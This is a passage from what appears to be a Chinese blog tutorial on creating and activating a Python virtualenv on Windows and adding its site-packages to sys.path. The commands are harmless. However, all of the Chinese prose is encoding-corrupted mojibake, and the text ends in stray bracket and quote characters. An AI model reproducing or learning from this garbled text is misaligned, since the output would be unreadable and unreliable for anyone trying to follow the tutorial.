·å¯ä»¥é˜²æ­¢å¼€å‘è¿‡ç¨‹ä¸­å®‰è£…çš„ä¾èµ–å½±å“åŸä¸»æœºä¸Šçš„pythonç¯å¢ƒï¼Œè€Œä¸”åœ¨è¿ç§»åˆ°ä¸Šçº¿ç¯å¢ƒä¸­æ—¶ï¼Œçœå»äº†é…ç½®ä¸Šçº¿ç¯å¢ƒä¸­çš„pythonè¿è¡Œç¯å¢ƒã€‚ å®‰è£…virtualenv è¿™é‡Œæˆ‘æ¨èä½¿ç”¨pipæˆ–è€…easy_installå®‰è£…ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹è½½virtualenv.pyæ¥æ„å»ºè™šæ‹Ÿç¯å¢ƒã€‚ ä½¿ç”¨pipå‘½ä»¤ pip install virtualenv å»ºç«‹ç¯å¢ƒ é¦–å…ˆè¿›å…¥ç½‘ç«™çš„æ ¹ç›®å½•ï¼ˆæˆ–è€…æ˜¯ä»»ä½•éœ€è¦å»ºç«‹è™šæ‹Ÿç¯å¢ƒçš„æ–‡ä»¶å¤¹ä¸‹ï¼‰ ä½¿ç”¨doså‘½ä»¤ virtualenv venv å…¶ä¸­venvä¸ºpythonçš„è™šæ‹Ÿç¯å¢ƒï¼Œå…¶ä¸­åŒ…æ‹¬äº†python.exeã€pipã€easy_installç­‰pythonç¯å¢ƒã€‚ æ¿€æ´»ç¯å¢ƒ å®Œæˆä¸Šä¸€æ­¥åï¼Œæ¥ä¸‹æ¥éœ€è¦åœ¨dosç•Œé¢æ¿€æ´»è™šæ‹Ÿç¯å¢ƒï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—æ¥ä¸‹æ¥ä¸‹è½½çš„pythonæ¨¡å—éƒ½ä½äºvenvä¸‹çš„pipç¯å¢ƒä¸­Scripts\\activate æ¿€æ´»è™šæ‹Ÿç¯å¢ƒdeactivate é€€å‡ºè™šæ‹Ÿç¯å¢ƒ æ¿€æ´»åå‘½ä»¤è¡Œå¼€å¤´å¤šäº†ï¼ˆvenvï¼‰ï¼Œå¦‚ä¸‹12E:\\code\\python-workplace\\flasker\\venv&gt;Scripts\\activate(venv) E:\\code\\python-workplace\\flasker\\venv&gt; å®‰è£…æ¨¡å— åœ¨ä¸Šé¢çš„åŸºç¡€ä¸‹ï¼Œé€šè¿‡pip install xxxxå®‰è£…çš„æ¨¡å—éƒ½æ˜¯å®‰è£…åœ¨venvç¯å¢ƒä¸‹çš„ï¼Œå¯¹ä¸»æœºä¸Šçš„ç¯å¢ƒæ²¡æœ‰å½±å“ã€‚ å¼•å…¥è·¯å¾„ åœ¨å…·ä½“ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æŠŠvenvçš„è·¯å¾„å¯¼å…¥sys.pathï¼Œè¿™æ ·æ‰å¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒä¸­çš„pythonæ¨¡å—ã€‚12importos,syssys.path.append(os.getcwd()+'\\\\venv\\\\Lib\\\\site-packages') åˆ°è¿™é‡Œå°±å®Œæˆäº†pythonè™šæ‹Ÿç¯å¢ƒçš„æ­å»ºï¼Œæ€»ä½“å¯¹ç»å¸¸å˜åŠ¨ç¼–ç¨‹ç¯å¢ƒçš„åŸæ—­çŒ¿æ¥è¯´è¿™æ˜¯ä¸ªéå¸¸æœ‰ç”¨åŠŸèƒ½ã€‚ ==The End=="}]}